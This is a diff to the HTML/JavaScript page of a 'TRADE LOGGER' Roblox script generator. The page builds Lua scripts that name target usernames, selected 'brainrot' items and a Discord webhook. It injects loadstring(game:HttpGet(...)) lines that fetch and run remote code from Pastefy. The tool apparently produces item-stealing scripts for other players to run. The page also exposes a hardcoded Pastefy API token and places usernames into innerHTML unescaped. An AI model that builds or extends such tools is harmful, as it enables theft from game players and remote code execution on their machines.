@@ -3,23 +3,23 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>MLKODUS</title>
+<title>TRADE LOGGER</title>
 <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;600;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
 <style>
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
   :root {
-    --bg: #0a1128;
-    --surface: #0d1b3e;
-    --panel: #1a2b5c;
-    --border: #2a4b8c;
-    --accent: #4d79ff;
+    --bg: linear-gradient(135deg, #0a1128 0%, #0d1b3e 50%, #1a2b5c 100%);
+    --surface: rgba(10, 17, 40, 0.8);
+    --panel: rgba(26, 43, 92, 0.7);
+    --border: #4eaad9;
+    --accent: #4eaad9;
     --purple: #3a5fff;
     --discord: #5865f2;
     --green: #10b981;
     --danger: #f43f5e;
     --text: #e2e8f0;
     --muted: #94a3b8;
-    --panel-shadow: 0 4px 6px -1px rgba(77, 121, 255, 0.15);
+    --panel-shadow: 0 4px 6px -1px rgba(78, 170, 217, 0.2);
   }
   body {
     background: var(--bg);
@@ -27,14 +27,15 @@
     font-family: 'Rajdhani', sans-serif;
     min-height: 100vh;
     overflow-x: hidden;
+    background-attachment: fixed;
   }
   body::before {
     content: '';
     position: fixed;
     inset: 0;
     background-image:
-      linear-gradient(rgba(77, 121, 255, 0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(77, 121, 255, 0.03) 1px, transparent 1px);
+      linear-gradient(rgba(78, 170, 217, 0.05) 1px, transparent 1px),
+      linear-gradient(90deg, rgba(78, 170, 217, 0.05) 1px, transparent 1px);
     background-size: 44px 44px;
     pointer-events: none;
     z-index: 0;
@@ -45,6 +46,9 @@
     max-width: 920px;
     margin: 0 auto;
     padding: 2.8rem 1.5rem 6rem;
+    backdrop-filter: blur(8px);
+    border-radius: 16px;
+    border: 1px solid rgba(78, 170, 217, 0.2);
   }
   /* Badges */
   .badge-og {
@@ -67,22 +71,22 @@
     letter-spacing: 1px;
     padding: 2px 6px;
     border-radius: 4px;
-    background: rgba(0, 0, 0, 0.2);
-    color: rgb(255, 255, 255);
-    border: 1px solid rgba(255, 255, 255, 0.1);
+    background: rgba(78, 170, 217, 0.15);
+    color: #4eaad9;
+    border: 1px solid rgba(78, 170, 217, 0.3);
     margin-left: 8px;
     cursor: default;
   }
  /* Conteneur des suggestions */
 .suggestions-container {
     position: absolute;
-    bottom: 100%; /* <-- Positionne au-dessus du champ */
+    bottom: 100%;
     left: 0;
     right: 0;
     background: var(--surface);
     border: 1px solid var(--border);
     border-radius: 8px;
-    margin-bottom: 8px; /* Espace entre le champ et les suggestions */
+    margin-bottom: 8px;
     max-height: 380px;
     overflow-y: auto;
     z-index: 100;
@@ -91,7 +95,6 @@
 }
 
 /* Élément de suggestion */
-/* Conteneur des suggestions (positionné au-dessus) */
 #usernameSuggestions {
     position: absolute;
     bottom: 100%;
@@ -117,7 +120,7 @@
     gap: 14px;
   }
   .suggestion-item:hover {
-    background: rgba(77, 121, 255, 0.12);
+    background: rgba(78, 170, 217, 0.12);
   }
 
   .suggestion-avatar {
@@ -127,7 +130,7 @@
     background: rgba(255,255,255,0.1);
     overflow: hidden;
     flex-shrink: 0;
-    border: 2px solid rgba(255,255,255,0.1);
+    border: 2px solid rgba(78, 170, 217, 0.3);
   }
   .suggestion-avatar img {
     width: 100%;
@@ -150,7 +153,7 @@
     font-weight: 500;
   }
   .suggestion-id {
-    color: rgba(77, 121, 255, 0.5);
+    color: rgba(78, 170, 217, 0.7);
     font-family: 'Share Tech Mono', monospace;
     font-size: 0.78rem;
   }
@@ -181,7 +184,7 @@
     font-weight: 700;
     letter-spacing: .1em;
     text-transform: uppercase;
-    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
+    background: linear-gradient(130deg, #4eaad9 0%, #3a5fff 100%);
     -webkit-background-clip: text;
     -webkit-text-fill-color: transparent;
     background-clip: text;
@@ -267,13 +270,13 @@
   }
   .search-input:focus {
     border-color: var(--accent);
-    box-shadow: 0 0 0 3px rgba(77, 121, 255, 0.25);
+    box-shadow: 0 0 0 3px rgba(78, 170, 217, 0.25);
   }
   .search-input::placeholder { color: #64748b; }
   .btn-sm {
     padding: .5rem .9rem;
-    background: rgba(77, 121, 255, 0.1);
-    border: 1px solid rgba(77, 121, 255, 0.3);
+    background: rgba(78, 170, 217, 0.1);
+    border: 1px solid rgba(78, 170, 217, 0.3);
     border-radius: 7px;
     color: var(--accent);
     font-family: 'Share Tech Mono', monospace;
@@ -285,7 +288,7 @@
     transition: background .2s, color .2s;
   }
   .btn-sm:hover {
-    background: rgba(77, 121, 255, 0.2);
+    background: rgba(78, 170, 217, 0.2);
     color: var(--text);
   }
   .btn-sm.red {
@@ -314,13 +317,13 @@
     gap: .65rem;
     padding: .48rem .9rem;
     cursor: pointer;
-    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+    border-bottom: 1px solid rgba(78, 170, 217, 0.1);
     transition: background .12s;
     user-select: none;
   }
   .a-item:last-child { border-bottom: none; }
-  .a-item:hover { background: rgba(77, 121, 255, 0.08); }
-  .a-item.on { background: rgba(77, 121, 255, 0.15); }
+  .a-item:hover { background: rgba(78, 170, 217, 0.08); }
+  .a-item.on { background: rgba(78, 170, 217, 0.15); }
   .a-item input[type="checkbox"] {
     -webkit-appearance: none;
     appearance: none;
@@ -385,7 +388,7 @@
   }
   .txt:focus {
     border-color: var(--accent);
-    box-shadow: 0 0 0 3px rgba(77, 121, 255, 0.25);
+    box-shadow: 0 0 0 3px rgba(78, 170, 217, 0.25);
   }
   .txt::placeholder { color: #64748b; }
   .hint { font-family: 'Share Tech Mono', monospace; font-size: .67rem; color: var(--muted); margin-top: .4rem; }
@@ -394,7 +397,7 @@
     display: block;
     width: 100%;
     padding: .92rem;
-    background: linear-gradient(130deg, var(--accent) 0%, var(--purple) 100%);
+    background: linear-gradient(130deg, #4eaad9 0%, #3a5fff 100%);
     border: none;
     border-radius: 10px;
     color: white;
@@ -405,11 +408,11 @@
     text-transform: uppercase;
     cursor: pointer;
     transition: all .2s;
-    box-shadow: 0 4px 6px -1px rgba(77, 121, 255, 0.25);
+    box-shadow: 0 4px 6px -1px rgba(78, 170, 217, 0.25);
     margin-bottom: 1.2rem;
   }
   .btn-gen:hover {
-    box-shadow: 0 6px 12px -2px rgba(77, 121, 255, 0.35);
+    box-shadow: 0 6px 12px -2px rgba(78, 170, 217, 0.35);
     transform: translateY(-1px);
   }
   .btn-gen:active { transform: none; }
@@ -427,8 +430,8 @@
   .btn-copy {
     margin-left: auto;
     padding: .26rem .7rem;
-    background: rgba(77, 121, 255, 0.1);
-    border: 1px solid rgba(77, 121, 255, 0.3);
+    background: rgba(78, 170, 217, 0.1);
+    border: 1px solid rgba(78, 170, 217, 0.3);
     border-radius: 6px;
     color: var(--accent);
     font-family: 'Share Tech Mono', monospace;
@@ -438,7 +441,7 @@
     cursor: pointer;
     transition: all .2s;
   }
-  .btn-copy:hover { background: rgba(77, 121, 255, 0.2); }
+  .btn-copy:hover { background: rgba(78, 170, 217, 0.2); }
   .btn-copy.ok { color: var(--green); border-color: var(--green); background: rgba(16, 185, 129, 0.1); }
   .code-block {
     background: var(--surface);
@@ -471,8 +474,8 @@
   .admin-mode-btn {
     flex: 1;
     padding: 0.5rem;
-    background: rgba(77, 121, 255, 0.1);
-    border: 1px solid rgba(77, 121, 255, 0.3);
+    background: rgba(78, 170, 217, 0.1);
+    border: 1px solid rgba(78, 170, 217, 0.3);
     border-radius: 7px;
     color: var(--accent);
     font-family: 'Share Tech Mono', monospace;
@@ -483,23 +486,58 @@
     transition: all 0.2s;
   }
   .admin-mode-btn.active {
-    background: rgba(77, 121, 255, 0.3);
+    background: rgba(78, 170, 217, 0.3);
     color: white;
     border-color: var(--accent);
   }
   .admin-mode-btn:hover:not(.active) {
-    background: rgba(77, 121, 255, 0.2);
+    background: rgba(78, 170, 217, 0.2);
   }
   #customAdminInput {
     display: none;
     margin-top: 1rem;
+  }
+
+  /* Multi-username input */
+  #targetUsernames {
+    min-height: 80px;
+    resize: vertical;
+  }
+  .username-list {
+    margin-top: 0.5rem;
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+  }
+  .username-tag {
+    background: rgba(78, 170, 217, 0.2);
+    border: 1px solid rgba(78, 170, 217, 0.3);
+    border-radius: 6px;
+    padding: 0.3rem 0.6rem;
+    font-size: 0.75rem;
+    display: flex;
+    align-items: center;
+    gap: 0.3rem;
+  }
+  .remove-tag {
+    cursor: pointer;
+    color: var(--accent);
+    font-weight: bold;
+    background: rgba(78, 170, 217, 0.3);
+    border-radius: 50%;
+    width: 16px;
+    height: 16px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 10px;
   }
 </style>
 </head>
 <body>
 <div class="wrap">
   <header>
-    <div class="logo-row"><h1>MLKODUS</h1></div>
+    <div class="logo-row"><h1>TRADE LOGGER</h1></div>
     <p class="tagline">Roblox • Brainrot • Trade Script Generator</p>
   </header>
   <div class="panel">
@@ -517,14 +555,15 @@
     </div>
   </div>
   <div class="panel">
-    <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Username</span></div>
+    <div class="ph"><div class="dot dot-purple"></div><span class="ph-title">Roblox Usernames</span></div>
     <div class="pb">
-      <label class="lbl">Target username</label>
-      <div style="position: relative;">
-        <input class="txt" id="usernameInput" type="text" placeholder="e.g. Builderman" autocomplete="off" spellcheck="false">
-        <div id="usernameSuggestions" class="suggestions-container"></div>
-    </div>
-      <p class="hint" id="usernameHint">The Roblox username to target in the script (3 characters minimum).</p>
+      <label class="lbl">Target usernames (one per line)</label>
+      <textarea class="txt" id="targetUsernames" placeholder="e.g.
+Builderman
+User123
+AnotherUser" rows="4" oninput="parseUsernames()"></textarea>
+      <div class="username-list" id="usernameList"></div>
+      <p class="hint" id="usernameHint">Enter one or more Roblox usernames to target in the script.</p>
     </div>
   </div>
   <div class="panel">
@@ -839,6 +878,7 @@ function generateAlias(length = 8) {
 let selected = new Set();
 let adminMode = 'no-gui';
 let customAdminLoadstring = '';
+let targetUsernames = [];
 
 function setAdminMode(mode) {
     adminMode = mode;
@@ -867,7 +907,7 @@ async function uploadToPastefy(script) {
                 'Authorization': 'Bearer TOqlFBWVLGEx5wKbIL0KCxXrH0K9OqaHldWifeQP7B2m2LOLuxfoGOgYF0j4'
             },
             body: JSON.stringify({
-                title: "MLKODUS Script - " + new Date().toLocaleDateString(),
+                title: "TRADE LOGGER Script - " + new Date().toLocaleDateString(),
                 content: script,
                 encrypted: false,
                 expireAt: "1D"
@@ -887,6 +927,32 @@ async function uploadToPastefy(script) {
     }
 }
 
+function parseUsernames() {
+    const input = document.getElementById('targetUsernames').value.trim();
+    targetUsernames = input.split('\n').filter(u => u.trim().length >= 3);
+    renderUsernameList();
+}
+
+function renderUsernameList() {
+    const container = document.getElementById('usernameList');
+    container.innerHTML = '';
+    targetUsernames.forEach(username => {
+        const tag = document.createElement('div');
+        tag.className = 'username-tag';
+        tag.innerHTML = `
+            <span>${username}</span>
+            <span class="remove-tag" onclick="removeUsername('${username}')">×</span>
+        `;
+        container.appendChild(tag);
+    });
+}
+
+function removeUsername(username) {
+    targetUsernames = targetUsernames.filter(u => u !== username);
+    document.getElementById('targetUsernames').value = targetUsernames.join('\n');
+    renderUsernameList();
+}
+
 async function generate() {
     const btn = document.querySelector('.btn-gen');
     const out = document.getElementById('outputBlock');
@@ -900,57 +966,60 @@ async function generate() {
         return;
     }
 
+    if (targetUsernames.length === 0) {
+        out.className = 'code-block empty';
+        out.textContent = 'Please enter at least one Roblox username.';
+        return;
+    }
+
     btn.disabled = true;
     btn.textContent = '⏳ Generating...';
     btn.style.opacity = '0.6';
 
     try {
-        const username = document.getElementById('usernameInput').value.trim();
         const webhook = document.getElementById('webhookInput').value.trim();
 
         if (selected.size === 0) throw new Error('Please select at least one brainrot animal.');
-        if (username.length < 3) throw new Error('Username must be at least 3 characters long.');
         if (!webhook.startsWith('https://discord.com/api/webhooks/')) throw new Error('Invalid webhook URL.');
 
         const alias = generateAlias();
 
         const kvResponse = await fetch(`${KV_WORKER_URL}/store`, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json'
-  },
-  body: JSON.stringify({ alias, url: webhook }),
-});
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ alias, url: webhook }),
+        });
 
         if (!kvResponse.ok) {
             const error = await kvResponse.json();
             throw new Error(error.error || 'Failed to store webhook.');
         }
 
-        const data = await kvResponse.json();
-
         const names = [...selected];
         const brainrotLines = names.map(n => ` ["${n}"] = true,`).join('\n');
 
         let adminScriptPart = '';
         if (adminMode === 'admin-panel') {
-    adminScriptPart = `
+            adminScriptPart = `
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/GKYBLds1/raw"))()
 end)
 `;
-} else if (adminMode === 'freeze') {
-    adminScriptPart = `
+        } else if (adminMode === 'freeze') {
+            adminScriptPart = `
 task.spawn(function()
     loadstring(game:HttpGet("https://pastefy.app/cnm84Kkc/raw"))()
 end)
 `;
-} else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
-    adminScriptPart = customAdminLoadstring;
-}
+        } else if (adminMode === 'custom' && customAdminLoadstring.trim()) {
+            adminScriptPart = customAdminLoadstring;
+        }
 
+        const targetUsernamesString = targetUsernames.map(u => `"${u}"`).join(', ');
         const script = `getgenv().WEBHOOK_URL = "${alias}"
-getgenv().TARGET_USERNAME = "${username}"
+getgenv().TARGET_USERNAMES = {${targetUsernamesString}}
 getgenv().TARGET_BRAINROT = {
 ${brainrotLines}
 }
@@ -986,97 +1055,6 @@ ${script}`;
         }, 1500);
     }
 }
-
-async function searchRobloxUsers(query) {
-    if (query.length < 3) return [];
-
-    try {
-        const proxyUrl = `https://roblox-search-proxy.vercel.app/api/roblox-search?keyword=${encodeURIComponent(query)}`;
-        const response = await fetch(proxyUrl);
-        if (!response.ok) throw new Error(`HTTP ${response.status}`);
-        const data = await response.json();
-        return data.data || [];
-    } catch (error) {
-        console.warn("Error during Roblox search:", error);
-        return [];
-    }
-}
-
-async function fetchAvatarUrl(userId) {
-    try {
-        const proxyUrl = `https://avatar-proxy.vercel.app/api/avatar-proxy?userId=${userId}`;
-        const response = await fetch(proxyUrl);
-        if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-        }
-        const data = await response.json();
-        return data.imageUrl || null;
-    } catch (error) {
-        console.warn(`Unable to load avatar for user ${userId}:`, error.message);
-        return null;
-    }
-}
-
-async function showSuggestions(users) {
-    const container = document.getElementById('usernameSuggestions');
-    container.innerHTML = '';
-
-    if (users.length === 0) {
-        const noResult = document.createElement('div');
-        noResult.className = 'suggestion-item';
-        noResult.innerHTML = `<span class="suggestion-username" style="color: var(--muted);">No user found.</span>`;
-        container.appendChild(noResult);
-        container.style.display = 'block';
-        return;
-    }
-
-    const userPromises = users.map(async (user) => {
-        const avatarUrl = await fetchAvatarUrl(user.id);
-        return { ...user, avatarUrl };
-    });
-
-    const usersWithAvatars = await Promise.all(userPromises);
-
-    usersWithAvatars.forEach(user => {
-        const item = document.createElement('div');
-        item.className = 'suggestion-item';
-        item.innerHTML = `
-            <div class="suggestion-avatar">
-                <img src="${user.avatarUrl || 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0OCIgaGVpZ2h0PSI0OCIgdmlld0JveD0iMCAwIDQ4IDQ4IiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIxIiBmaWxsPSJub25lIiBzdHJva2UtbGluZWNhcD0icm91bmQiPjxjaXJjbGUgY3g9IjI0IiBjeT0iMjQiIHI9IjI0Ii8+PC9zdmc+'}" alt="${user.name}">
-            </div>
-            <div class="suggestion-info">
-                <p class="suggestion-username">${user.displayName || user.name}</p>
-                <p class="suggestion-handle">@${user.name}</p>
-            </div>
-            <span class="suggestion-id">${user.id}</span>
-        `;
-        item.onclick = () => {
-            document.getElementById('usernameInput').value = user.name;
-            container.style.display = 'none';
-            validateUsername();
-        };
-        container.appendChild(item);
-    });
-    container.style.display = 'block';
-}
-
-const debounce = (func, delay) => {
-    let timeoutId;
-    return function(...args) {
-        clearTimeout(timeoutId);
-        timeoutId = setTimeout(() => func.apply(this, args), delay);
-    };
-};
-
-document.getElementById('usernameInput').addEventListener('input', debounce(async function(e) {
-    const query = e.target.value.trim();
-    if (query.length === 0) {
-        document.getElementById('usernameSuggestions').style.display = 'none';
-        return;
-    }
-    const users = await searchRobloxUsers(query);
-    showSuggestions(users);
-}, 300));
 
 function renderList(filter) {
     const q = (filter || '').toLowerCase();
@@ -1114,20 +1092,6 @@ function toggle(name) {
 function filterList() { renderList(document.getElementById('searchBox').value); }
 function selectAll() { ANIMALS.forEach(n => selected.add(n.name)); renderList(document.getElementById('searchBox').value); }
 function clearAll() { selected.clear(); renderList(document.getElementById('searchBox').value); }
-
-function validateUsername() {
-    const username = document.getElementById('usernameInput').value.trim();
-    const hint = document.getElementById('usernameHint');
-    if (username.length < 3) {
-        hint.classList.add('error');
-        hint.textContent = 'Username must be at least 3 characters long!';
-        return false;
-    } else {
-        hint.classList.remove('error');
-        hint.textContent = 'The Roblox username to target in the script (3 characters minimum).';
-        return true;
-    }
-}
 
 function validateWebhook() {
     const webhook = document.getElementById('webhookInput').value.trim();
